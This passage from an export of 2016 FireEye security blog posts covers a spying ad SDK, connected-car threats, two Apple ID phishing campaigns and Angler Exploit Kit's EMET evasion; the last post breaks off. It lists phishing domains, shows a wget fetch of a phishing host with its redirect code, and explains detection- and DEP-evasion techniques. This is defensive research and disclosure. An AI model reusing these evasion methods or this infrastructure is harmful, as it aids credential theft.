    recording through Vpon’s undisclosed Cordova plugin in Cycript</span></p>
 <p>The subsequent execution of the above cmd resulted in a stealth
  recording saved to the Documents directory within the app sandbox.</p>
 <h4>Two Routes to Profit</h4>
 <p>While we did not capture real network traffic during our
  investigation that proves a perceived wrongdoing, we see no
  justification for an ad platform provider, such as Vpon, to have the
  code ability to use the microphone for voice recording, use the camera
  for taking pictures and recording videos, access the address book,
  manipulate the app sandbox, and perform other behaviors.</p>
 <p>The current setup offers opportunity to two types of potential
  malicious actors who can profit from the developers and the app users.</p>
 <ul> <li>Profiter:<b> Vpon SDK provider</b>. To this point, it should
    not be surprising that it’s up to the Vpon SDK provider’s
    benevolence that apps embedded with this malicious SDK are not
    behaving improperly for their users. However, in the case where such
    benevolence runs out, the users will suffer undesirable loss of
    privacy and security.</li> <li>Profiter: <b>A third party network
    hijacker</b>. As we have illustrated, a portion of the contents
    provided to the user by the ad SDK provider are through the network
    communication on top of the HTTP protocol. The commands are
    delivered through the remote web pages, in the form of HTML and
    JavaScript. Therefore, a third party network attacker can take
    advantage of a man in the middle (MitM) setup to activate the
    seemingly dormant malicious behavior.</li> </ul>
 <h4>
  <b>Food for Thought</b></h4>
 <p>In this blog post, we showed that a third party ad library provider,
  Vpon, is stowing aggressive and risky code ability into the apps that
  adopt it as an ad-serving platform. This is not the first time FireEye
  mobile security researchers have seen such attempts. In November 2015,
  we reported <a href=""https://www.fireeye.com/content/fireeye-www/en_US/blog/threat-research/2015/11/ibackdoor_high-risk.html"">iBackdoor</a>,
  a similar threat with a backdoored ad SDK leveraging remote JavaScript
  to manipulate the device and exfiltrate sensitive information without
  permission. Third party libraries – ad libraries in particular – are
  often unvetted by the community. It is common and expected that app
  developers will integrate third party libraries into their apps, so
  developers should exert caution.</p>
 <p>Following our responsible disclosure guidelines, we contacted Apple
  and Vpon respectively on May 10, 2016. Apple acknowledged the
  findings, but offered no further feedback. Vpon did not respond when
  we reached out.</p>",http://www.fireeye.com/blog/threat-research/2016/06/pwned_by_vpon.html
Connected Cars: The Open Road for Hackers,"<p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/autoreport-blog.jpg"" /></p>
 <p>As vehicles become both increasingly complex and better connected to
  the Internet, their newfound versatility may be manipulated for
  malicious purposes. Three of the most concerning potential threats
  looking ahead to the next few years are those posed by <b>
    <i>manipulating vehicle</i> <i>operation</i></b>,<b>
  <i>ransomware</i></b> and using vehicular systems as <b>
    <i>command and control (C2) infrastructure</i></b> for illicit cyber activity.</p>
 <h5>
  <b>Car Hacking?</b></h5>
 <p>Vehicles have come a long way in terms of the high-tech features and
  connectivity that come standard in most new models. Modern cars are
  controlled almost entirely by software, and many drivers don’t realize
  the most complex digital device they own may be in their <a href=""http://www.nytimes.com/2015/09/27/business/complex-car-software-becomes-the-weak-spot-under-the-hood.html"">driveway</a>.
  Of the growing number of devices in the “Internet of Things” (IoT),
  vehicles are among the most significant additions to the global
  Internet. An ever-growing list of features—including web browsing,
  Wi-Fi access points, and remote-start mobile phone apps—enhance user
  enjoyment, but also greatly expand vehicles’ attack surface, rendering
  them potentially vulnerable to advanced attacks. During the past year
  especially, numerous proof-of-concept demonstrations have revealed
  connected-car vulnerabilities that malicious actors can exploit,
  ranging from unauthorized entry to <a href=""https://www.wired.com/2015/07/hackers-remotely-kill-jeep-highway/"">commandeering
    the vehicle’s operation</a>. Unfortunately, as consumer demand
  drives ever more features, the opportunities for compromise will
  increase as well.</p>
 <h5>
  <b>Ransomware</b></h5>
 <p>The scourge of ransomware has so far affected thousands of systems
  belonging to ordinary individuals, hospitals, and police stations. A
  vehicle’s increased connectivity, ever-expanding attack surface, and
  high upfront cost make them attractive ransomware targets. In contrast
  to ransomware that infects ordinary computer systems, vehicles are
  more likely susceptible to ransomware attacks when their disablement
  causes knock-on effects.</p>
 <p>For example, where a single driver might be able to reinstall his
  car’s software with the help of a mechanic to remedy a ransomware
  infection, a group of vehicles disabled on a busy highway could cause
  far more serious disruption. Victims or municipal authorities may have
  little choice but to pay the ransom to reopen a busy commuting route.
  Alternatively, a logistics company might suddenly find a large portion
  of its truck fleet rendered useless by ransomware. The potential for
  lost revenue due to downtime might pressure the company to pay the
  ransom rather than risk more significant financial losses.</p>
 <h5>
  <b>Malicious C2 and Final Hop Points</b></h5>
 <p>One effective law enforcement tactic in countering cyber espionage
  and criminal campaigns is identifying, locating and seizing the
  systems threat actors use to route malicious traffic through the
  Internet. Since many modern vehicles can be better described as a
  computer attached to four wheels and an engine, their mobility and
  power present challenges to this means of countering threat activity.
  We have already witnessed malware designed to hijack IoT devices for
  malicious purposes; vehicular systems’ greater computing power,
  compared to connected home thermostats, can significantly enhance
  their value as a <a href=""https://www.akamai.com/us/en/about/news/press/2014-press/akamai-warns-of-large-ddos-attacks-from-spike-ddos-toolkit.jsp"">C2 node</a>.</p>
 <p>Locating vehicles used to route malicious traffic would present a
  major challenge to law enforcement investigation, largely due to their
  mobility. We have not yet observed threat actors using connected
  vehicle systems to route malicious traffic, but it is most likely that
  a vehicle would be used as a final hop point to the intended target
  network. The perpetrators may use the vehicle only once, choosing to
  hijack the connectivity of a different vehicle on their next
  operation, and so on. This ever-changing roster of potential last-hop
  nodes situated on highly mobile platforms may allow threat actors to
  elude law enforcement for extended periods of time.</p>
 <h5>
  <b>Understanding the Risk Landscape</b></h5>
 <p>The impact of cyber threats is most often considered in financial
  terms—the cost of a breach, whether direct financial losses or
  indirect costs of investigation, remediation, and improved security.
  As computers increasingly control vehicles, among other critical
  devices and systems, the potential for malfunction or manipulation
  that causes human harm rises dramatically. Automobile manufacturers
  may face greater liability, not only for the car’s physical
  components, but its software as well. How long before vehicles need a
  “cyber security rating,” similar to that awarded for crash testing and
  fuel economy?</p>
 <p>These new risks point to the need for automotive manufacturers and
  suppliers to not only ensure the traditional operational safety of
  their vehicles, but to also secure both the vehicle's operations and
  occupant privacy. This requires an ongoing understanding about the
  nature of threats and vulnerabilities in a rapidly evolving landscape,
  and building in strong proactive security measures to protect against
  these risks.<i> </i>FireEye explores these risks to automotive safety
  in our latest FireEye iSIGHT Intelligence and Mandiant Consulting
  report: <i>Connected Cars: The Open Road for Hackers</i>. The report
  is <a href=""https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/connected-cars-the-open-road-for-hackers.pdf"" target=""_blank"">available
    for download here.</a></p>
 <h5>
  <b>
    <i>FireEye Capabilities</i></b></h5>
 <p>
  <i>FireEye combines our industry leading <a href=""https://www.fireeye.com/content/fireeye-www/en_US/products/dynamic-threat-intelligence.html"">threat
    intelligence</a>, <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/mandiant-incident-response.html"">incident
    response</a> and red team capabilities with our ICS domain expertise
    to help the automotive industry improve their prevention, detection
    and response capabilities. FireEye’s <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/red-team-operations.html"">Red
      Team Operations</a> and <a href=""https://www.fireeye.com/content/fireeye-www/en_US/services/penetration-testing.html"">Penetration
    Tests</a> can provide firms in the automotive industry experience
    responding to real-world attacks without the risk of negative
    headlines. A one-time risk assessment is not enough, because threat
    attackers are consistently evolving.</i></p>
 <p>
  <i>For more information, <a href=""https://www.fireeye.com/content/fireeye-www/en_US/company/contact-us.html"">contact FireEye</a>.</i></p>
 <p>
  <i>FireEye iSIGHT Intelligence’s Horizons Team conducts strategic
    forecasting to anticipate risks posed by emerging technologies and
    geopolitical developments, helping clients and the public better
    assess their exposure to a dynamic cyber threat landscape.</i></p>",http://www.fireeye.com/blog/threat-research/2016/06/connected_cars_the.html
Rotten Apples: Apple-like Malicious Phishing Domains,"<p>At FireEye Labs we have an automated system designed to proactively
  detect newly registered malicious domains. This system observed some
  phishing domains registered in the first quarter of 2016 that were
  designed to appear as legitimate Apple domains. These phony Apple
  domains were involved in phishing attacks against Apple iCloud users
  in China and UK. In the past we have observed several phishing domains
  targeting Apple, Google and Yahoo users; however, <b>
    <u>these campaigns are unique as they are serving the same malicious
      phishing content from different domains to target Apple users.</u></b></p>
 <p>Since January 2016 we have observed several phishing campaigns
  targeting the Apple IDs and passwords of Apple users. Apple provides
  all of its customers with an Apple ID, a centralized personal account
  that gives access to iCloud and other Apple features and services such
  as the iTunes Store and App Store. Users will provide their Apple ID
  to sign in to iCloud[.]com, and use the same Apple ID to set up iCloud
  on their iPhone, iPad, iPod Touch, Mac, or Windows computer.</p>
 <p>iCloud ensures that users always have the latest versions of their
  important information –  including documents, photos, notes, and
  contacts – on all of their Apple devices. iCloud provides an easy
  interface to share photos, calendars, locations and more with friends
  and family, and even helps users find their device if they lose it.
  Perhaps most importantly, its iCloud Keychain feature allows user to
  store <b>
    <u>passwords and credit card information</u></b> and have it entered
  automatically on their iOS devices and Mac computers.</p>
 <p>Anyone with access to an Apple ID, password and some additional
  information, such as date of birth and device screen lock code, can
  completely take over the device and use the credit card information to
  impersonate the user and make purchases via the Apple Store.</p>
 <p>This blog highlights some highly organized and sophisticated
  phishing attack campaigns we observed targeting Apple customers.</p>
 <h5>Campaign 1: Zycode phishing campaign targeting Apple's Chinese
  Customers<br /> </h5>
 <p>This phishing kit is named “zycode” after the value of a password
  variable embedded in the JavaScript code which all these domains serve
  in their HTTP responses.</p>
 <p>The following is a list of phishing domains targeting Apple users
  detected by our automated system in March 2016. None of these domains
  are registered by Apple, nor are they pointing to Apple infrastructure:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/newfig1abbassi.jpg"" /></p>
 <p>The list shows that the attackers are attempting to mimic websites
  related to iTunes, iCloud and Apple ID, which are designed to lure and
  trick victims into submitting their Apple IDs.</p>
 <p>Most of these domains appeared as an Apple login interface for Apple
  ID, iTunes and iCloud. The domains were serving highly sophisticated,
  obfuscated and suspicious JavaScripts, which was creating the phishing
  HTML content on the web page. This technique is effective against
  anti-phishing systems that rely on the HTML content and analyze the forms.</p>
 <p>From March 7 to March 12, the following domains used for Apple ID
  phishing were observed, all of which were registered by a few entities
  in China using a qq[.]com email address: iCloud-Apple-apleid[.]com,
  Appleid-xyw[.]com, itnues-appid[.]com, AppleidApplecwy[.]com,
  appie-itnues[.]com, AppleidApplecwy[.]com, Appleid-xyw[.]com,
  Appleid-yun-iCloud[.]com, iCloud-Apple-apleid[.]com,
  iphone-ioslock[.]com, iphone-appdw[.]com.</p>
 <p>From March 13 to March 20, we observed these new domains using the
  exact same phishing content, and having similar registrants:
  iCloud-Appleid-yun[.]win, iClouddd[.]top, iCloudee[.]top,
  iCloud-findip[.]com, iCloudhh[.]top, ioslock-Apple[.]com,
  ioslock-iphone[.]com, iphone-iosl0ck[.]com, lcloudmid[.]com</p>
 <p>On March 30, we observed the following newly registered domains
  serving this same content: iCloud-mail-Apple[.]com,
  Apple-web-icluod[.]com, Apple-web-icluodid[.]com,
  AppleidAppleiph[.]com , icluod-web-ios[.]com and ios-web-Apple[.]com</p>
 <h5>Phishing Content and Analysis</h5>
 <p>Phishing content is usually available in the form of simple HTML,
  referring to images that mimic a target brand and a form to collect
  user credentials. Phishing detection systems look for special features
  within the HTML content of the page, which are used to develop
  detection heuristics. This campaign is unique as a simple GET request
  to any of these domains results in an encoded JavaScript content in
  the response, which does not reveal its true intention unless executed
  inside a web browser or a JavaScript emulator. For example, the
  following is a brief portion of the encoded string taken from the code.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Code1.png"" /></p>
 <p>This encoded string strHTML goes through a complex sequence of
  around 23 decrypting/decoding functions that include number system
  conversions, pseudo-random pattern modifiers followed by XOR decoding
  using a fixed key or password “zycode” for the actual HTML phishing
  content to be finally created (refer to Figure 15 and Figure 16 in
  Appendix 1 for complete code). Phishing detection systems that rely
  solely on the HTML in the response section will completely fail to
  detect the code generated using this technique.</p>
 <p>Once loaded into the web browser, this obfuscated JavaScript creates
  an iCloud phishing page. This page is shown in Figure 1.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: The page created by the obfuscated
    JavaScript as displayed in the browse</span>r</p>
 <p>The page is created by the de-obfuscated content seen in Figure 2.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Deobfuscated conten</span>t</p>
 <p>Burp Suite is a tool to secure and penetrate web applications:
  https://portswigger[.]net/burp/.  The Burp session of a user supplying
  login and password to the HTML form is shown in Figure 3. Here we can
  see 5 variables (u,p,x,y and cc) and a cookie being sent via HTTP POST
  method to the page save.php.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig3.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 3: Burp sessio</span>n</p>
 <p>After the user enters a login and password, they are redirected and
  presented with the following Chinese Apple page, seen in Figure 4:<a href=""http://iclouddd.top/ask2.asp?MNWTK=25077126670584.html"">  http://iClouddd[.]top/ask2.asp?MNWTK=25077126670584.html</a></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig4.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 4: Phishing pag</span>e</p>
 <p>On this page, all the links correctly point towards Apple[.]com, as
  can be seen in the HTML:</p>
 <p>  * Apple &lt;http://www.Apple[.]com/cn/&gt;<br />   *
  &lt;http://www.Apple[.]com/cn/shop/goto/bag&gt;<br />   * Apple
  &lt;http://www.Apple[.]com/cn/&gt;<br />   * Mac
  &lt;http://www.Apple[.]com/cn/mac/&gt;<br />   * iPad
  &lt;http://www.Apple[.]com/cn/ipad/&gt;<br />   * iPhone
  &lt;http://www.Apple[.]com/cn/iphone/&gt;<br />   * Watch
  &lt;http://www.Apple[.]com/cn/watch/&gt;<br />   * Music
  &lt;http://www.Apple[.]com/cn/music/&gt;<br />   *
  &lt;http://www.Apple[.]com/cn/support/&gt;<br />   * Apple[.]com
  &lt;http://www.Apple[.]com/cn/search&gt;<br />   * &lt;http://www.Apple[.]com/cn/shop/goto/bag&gt;</p>
 <p>Apple ID &lt;https://Appleid.Apple[.]com/account/home&gt;</p>
 <p>  * &lt;https://Appleid.Apple[.]com/zh_CN/signin&gt;<br />   * Apple
  ID &lt;https://Appleid.Apple[.]com/zh_CN/account&gt;<br />   * &lt;https://Appleid.Apple[.]com/zh_CN/#!faq&gt;</p>
 <p>When translated using Google Translate, the Chinese text written in
  the middle of the page (Figure 4) reads: “Verify your birth date or
  your device screen lock to continue”.</p>
 <p>Next the user was presented with an <b>
    <u>ask3.asp</u></b> webpage shown in Figure 5.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig5.png"" /></p>
 <p>
  <span class=""type-XS""> </span></p>
 <p>
  <span class=""type-XS"">Figure 5: Phishing form asking for more details
    from victim</span>s</p>
 <p>
  <b>Translation:</b> <i>“Please verify your security question”</i></p>
 <p>As shown in Figure 5, the page asks the user to answer three
  security questions, followed by redirection to an <b>
    <u>ok.asp</u></b> page (Figure 6) on the same domain:</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig6.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 6: Successful submission phishing pag</span>e</p>
 <p>The final link points back to Apple[.]com. The complete trail using
  Burp suite tool is shown in Figure 7.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig7.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 7: Burp ses</span>sion</p>
 <p>
  <span class=""type-XS"">We noticed that if the user tried to supply the
    same Apple ID twice, they got redirected to the page <b>
      <u>save[.]asp</u></b> shown in Figure 8. Clicking OK on the popup
    redirected the user back to the main page.</span>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig8.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 8: Error prompt generated by phishing </span>page</p>
 <h5>Domain Registration Information</h5>
 <p>We found that the registrant names for all of these phony Apple
  domains were these Chinese names: “<b>Yu Hu” and “Wu Yan”, “Yu Fei”
  </b>and <b>“Yu Zhe”.</b> Moreover, all these domains were registered
  with qq[.].com email addresses. Details are available in <b>Table
  1</b> below.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Tab1.png"" /></p>
 <p>
  <span class=""type-XS"">Table 1: Domain registration information</span></p>
 <p>Looking closer at our malicious domain detection system, we observed
  that the system had been seeing similar domains at an increasing
  frequency. Analyzing the registration information, we found some
  interesting patterns. Since January 2016 to the time of writing, the
  system marked around 240 unique domains that have something to do with
  Apple ID, iCloud or iTunes. From these <b>
    <u>240 domains</u></b>, we identified <b>
    <u>154 unique email registrants</u></b> with 64 unique emails
  pointing to qq[.]com, 36 unique Gmail email accounts, and 18 unique
  email addresses each belonging to 163[.]com and 126[.]com, and a
  couple more registered with 139[.]com.</p>
 <p>This information is vital, as it could be used in following
  different ways:</p>
 <ul> <li>The domain list provided here could be used by Apple customers
    as a blacklist; they can avoid browsing to such domains and
    providing credentials to any of the listed domains, whether they
    receive them via SMS, email or via any instant messaging
  service.</li> <li>The Apple credential phishing detection teams could
    use this information, as it highlights that all domains registered
    with these email addresses, registrant names and addresses, as well
    as their combinations, are potentially malicious and serving
    phishing content. This information could be used to block all future
    domains registered by the same entities.</li> <li>Patterns emerging
    from this data reveal that for such campaigns, attackers prefer to
    use email addresses from Chinese services such as qq.com, 126.com
    and 138.com. It has also been observed that instead of names, the
    attackers have used numbers (such as 545454@qq[.]com and
    891495200@qq[.]com) in their email addresses.</li> </ul>
 <h5>Geo-location:</h5>
 <p>As seen in Figure 9, we observed all of these domains pointing to 13
  unique IP addresses distributed across the U.S. and China, suggesting
  that these attacks were perhaps targeting users from these
    regions<span class=""type-XS"">.</span>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig9.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 9: Geo-location plot of the IPs for this camp</span>aign</p>
 <h4>Campaign 2: British Apples Gone Bad</h4>
 <p>Our email attacks research team unearthed another targeted phishing
  campaign against Apple users in the UK. Table 2 is a list of 86 Apple
  phishing domains that we observed since January 2016.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/newerfig9.png"" /></p>
 <p> </p>
 <h5>
  <span class=""type-XS"">Figure 9: Geo-location plot of the IPs for this campaign</span></h5>
 <h5>Phishing Content and Analysis</h5>
 <p>All of these domains have been serving the same phishing content. A
  simple HTTP GET (via the wget utility) to the domain’s main page
  reveals HTML code containing a meta-refresh redirection to the
  signin.php page.</p>
 <p>
  <b>A wget session is shown here:</b></p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""468""> <tbody>
    <tr>
      <td valign=""top"" width=""468""><p>$ wget
        http://manageAppleid84913[.]net</p> <p>--2016-04-05 16:47:44-- 
        http://manageAppleid84913[.]net/</p> <p>Resolving
          manageAppleid84913[.]net (manageAppleid84913[.]net)...
        109.123.121.10</p> <p>Connecting to manageAppleid84913[.]net
          (manageAppleid84913[.]net)|109.123.121.10|:80...
        connected.</p> <p>HTTP request sent, awaiting response... 200
        OK</p> <p>Length: 203 [text/html]</p> <p>Saving to:
        ‘index.html.1’</p> <p> </p>
          <p>100%[============================================================================================================&gt;]
          203         --.-K/s   in 0s      </p> <p> </p> <p>2016-04-05
          16:47:44 (37.8 MB/s) - ‘index.html.1’ saved [203/203]</p>
      </td> </tr></tbody></table>
 <p>
  <b>Content of the page is displayed here:</b></p>
 <table border=""1"" cellpadding=""0"" cellspacing=""0"" width=""468""> <tbody>
    <tr>
      <td valign=""top"" width=""468""><p>&lt;meta
          http-equiv=&quot;refresh&quot;
          content=&quot;0;URL=signin.php?c=ODcyNTA5MTJGUjU0OTYwNTQ5NDc3MTk3NTAxODE2ODYzNDgxODg2NzU3NA==&amp;log=1&amp;sFR=ODIxNjMzMzMxODA0NTE4MTMxNTQ5c2RmZ3M1ZjRzNjQyMDQzNjgzODcyOTU2MjU5&amp;email=&quot;
        /&gt;</p> <p> </p> </td> </tr></tbody></table>
 <p>This code redirects the browser to this URL/page:</p>
 <p>
  <a href=""http://manageappleid84913.net/signin.php?c=OTYwNzUyNjlGUjU0OTYwNTQ5NDY0MDgxMjQ4OTQ5OTk0MTQ3MDc1NjYyOA==&amp;log=1&amp;sFR=ODc0MjQyNTEyNzMyODE1NTMxNTQ5c2RmZ3M1ZjRzNjQzMDU5MjUzMzg4NDMzNzE1&amp;email="">http://manageAppleid84913[.]net/signin.php?c=OTYwNzUyNjlGUjU0OTYwNTQ5NDY0MDgxMjQ4OTQ5OTk0MTQ3MDc1NjYyOA==&amp;log=1&amp;sFR=ODc0MjQyNTEyNzMyODE1NTMxNTQ5c2RmZ3M1ZjRzNjQzMDU5MjUzMzg4NDMzNzE1&amp;email=#</a></p>
 <p>This loads a highly obfuscated JavaScript in the web browser that,
  on execution, generates the phishing HTML code at runtime to evade
  signature-based phishing detection systems. This is seen in Figure 17
  in Appendix 2, with a deobfuscated version of the HTML code being
  shown in Figure 18.</p>
 <p>This code renders in the browser to create the fake Apple ID
  phishing webpage seen in Figure 10, which resembles the authentic
  Apple page <a href=""https://appleid.apple.com/"">https://Appleid.Apple[.]com/</a><span class=""type-XS"">.</span>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig10.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 10: Screenshot of the phishing page as
    seen by the victims in the bro</span>wser</p>
 <p>On submitting a fake username and password, the form gets submitted
  to <b>signin-box-disabled.php</b> and the JavaScript and jQuery
  creates the page seen in Figure 11, informing the user that the Apple
  ID provided has been locked and the user must unlock it:<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig11.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 11: Phishing page suggesting victims to
    unlock their Apple</span> IDs</p>
 <p>, which requests personal information such as name, date of birth,
  telephone numbers, addresses, credit card details and security
  questions, as shown in Figure 12. While filling out this form, we
  observed that the country part of the address drop-down menu only
  allowed address options from England, Scotland and Wales, suggesting
  that this attack is targeting these regions onlyClicking on unlock
  leads the user to the page <b>profile.php</b>
  <span class=""type-XS"">.</span>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig12.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 12: User information requested by
    phishing </span>page</p>
 <p>On submitting false information on this form, the user would get a
  page asking to wait while the entered information is confirmed or
  verified. After a couple of seconds of processing, the page
  congratulates the user that their Apple ID was successfully unlocked
  (Figure 13). As seen in Figure 14, the user is then redirected to the
  authentic Apple page at <a href=""https://appleid.apple.com/"">https://Appleid.Apple[.]com/</a><span class=""type-XS"">.</span>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig13.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 13: Account verification page displayed
    by the phishing </span>site<img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig14.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 14: After a successful attack, victims
    are redirected to the real apple login </span>page</p>
 <h5>Domain Registration Information</h5>
 <p>It was observed that all of these domains used the whois privacy
  protection feature offered by many registrars. This feature enables
  the registrants to hide their personal and contact information which
  otherwise is available via the whois service. These domains were
  registered with the email “<a href=""mailto:contact@privacyprotect.org"">contact@privacyprotect[.]org</a>”</p>
 <h5>Geo-location</h5>
 <p>All these domains (Table 2) were pointing to IPs in the UK,
  suggesting that they were hosted in the UK.</p>
 <h4>Conclusion</h4>
 <p>Cybercriminals are targeting Apple users by launching phishing
  campaigns focused on stealing Apple IDs, as well as personal,
  financial and other information. We witnessed a high frequency of
  these targeted phishing attacks in the first quarter of 2016. A few
  phishing campaigns were particularly interesting because of their
  sophisticated evasion techniques (using code encoding and
  obfuscation), geographical targets, and because the same content was
  being served across multiple domains, which indicates the same
  phishing kits were being used.</p>
 <p>One campaign we detected in March used sophisticated
  encoding/encryption techniques to evade phishing detection systems and
  provided a realistic looking Apple/iCloud interface. The majority of
  these domains were registered by individuals having email addresses
  pointing to Chinese services – registrant email, contact and address
  information points to China. Additionally, the domains were serving
  phony Apple webpages in Chinese, indicating that they were targeting
  Chinese users.</p>
 <p>The second campaign we detected was launched against Apple users in
  the UK. This campaign used sophisticated evasion techniques (such as
  code obfuscation) to evade phishing detection systems and, whenever
  successful, was able to collect Apple IDs and personal and credit card
  information from its victims.</p>
 <p>Organizations could use the information provided in this blog to
  protect their users from such sophisticated phishing campaigns by
  writing signatures for their phishing detection and prevention systems.</p>
 <h4>Credits and Acknowledgements</h4>
 <p>Special thanks to Yichong Lin, Jimmy Su, Mary Grace and Gaurav Dalal
  for their support.</p>
 <h4>Appendix 1<span class=""type-XS""></span></h4>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig15.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 15: Obfuscated JavaScript served by the
    phishing site. In Green we have highlighted functions with: number
    system converters, pseudo-random pattern decoders, bit level binary operas</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig16.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 16: Obfuscated JS served by the phishing
    site. In Green we have highlighted functions with: number system
    converters, pseudo-random pattern decoders, bit level binary
    operaters. While in Red we have: XOR deco</span>ders.</p>
 <h4>Appendix 2</h4>
 <h4>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig17.png"" /></h4>
 <p>
  <span class=""type-XS"">Figure 17: Obfuscated JavaScript content served
    by the site</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Apple%20Phishing%20Abbassi/Fig18.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 18: Deobfuscated HTML content</span></p>
 <p>For more information on phishing, please visit:</p>
 <p>https://support.apple.com/HT203126<br />
  http://www.apple.com/legal/more-resources/phishing/<br /> https://support.apple.com/HT204759</p>
 <p> </p>",http://www.fireeye.com/blog/threat-research/2016/06/rotten_apples_apple.html
Angler Exploit Kit Evading EMET,"<p>We recently encountered some exploits from Angler Exploit Kit (EK)
  that are completely evading Microsoft’s Enhanced Mitigation Experience
  Toolkit (EMET). This is something we are seeing for the first time in
  the wild, and we only observed it affecting systems running Windows 7.</p>
 <p>Angler EK uses complex multi-layered code obfuscation and leverages
  multiple exploits, as seen in Figure 1 and Figure 2. These
  capabilities make Angler EK one of the more sophisticated exploit kits
  in use at this time.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig1.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 1: An excerpt of obfuscated javascript
    implemented by Angler EK is provided</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig2.png"" /></p>
 <p>
  <span class=""type-XS"">Figure 2: Angler JavaScript Obfuscation</span></p>
 <p>Within the deobfuscated JavaScript, which an attacker might inject
  into a webpage, we found that objects were being created for Flash
  (Figure 3) and Silverlight (Figure 4) to exploit vulnerabilities in
  those plugins.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig3.png"" />
  <span class=""type-XS"">Figure 3: Flash Object usage in deobfuscated content</span></p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig4.png"" />
  <span class=""type-XS"">Figure 4: Silverlight Object usage in
    deobfuscated content</span></p>
 <p>While exploiting Flash and other third party frameworks is common
  practice, we identified that Angler EK has implemented exploits that
  are successfully evading EMET.</p>
 <p>
  <b>
    <u>Evasion:</u></b></p>
 <p>EMET consists of many exploit mitigations that thwart modern exploit
  kit attempts. These exploit mitigations include:</p>
 <ol> <li>ASR</li> <li>EAF</li> <li>EAF+</li> <li>Caller Check</li>
  <li>SimExecFlow</li> <li>StackPivot</li> <li>MemProt</li> </ol>
 <p>Modern exploit kits may contain VBScript, Flash, Silverlight and
  even Internet Explorer exploits. Out of these, VBScript exploits are
  mitigated by ASR check and there is no evasion for that as of now,
  since EMET simply restricts vbscript.dll from being loaded.</p>
 <p>The ability of Angler EK to evade EMET mitigations and successfully
  exploit Flash and Silverlight is fairly sophisticated in our opinion.
  These exploits do not utilize the usual return oriented programming to
  evade DEP. Data Execution Prevention (DEP) is a mitigation developed
  to prevent the execution of code in certain parts of memory. The
  Angler EK uses exploits that do not utilize common return oriented
  programming (ROP) techniques to evade DEP. Instead, they use Flash.ocx
  and Coreclr.dll’s inbuilt routines to call VirtualProtect and
  VirtualAlloc, respectively, with PAGE_EXECUTE_READWRITE, thus evading
  DEP and evading return address validation-based heuristics.</p>
 <p>
  <u>DEP Evasion:</u></p>
 <p>As seen in Figure 5, the Silverlight exploit uses coreclr.dll’s
  routines to evade DEP before shellcode is executed.</p>
 <p>
  <img src=""https://www.fireeye.com/content/dam/fireeye-www/blog/images/Angler%20EK%20Pande/Fig5.png"" /></p>
 <p>
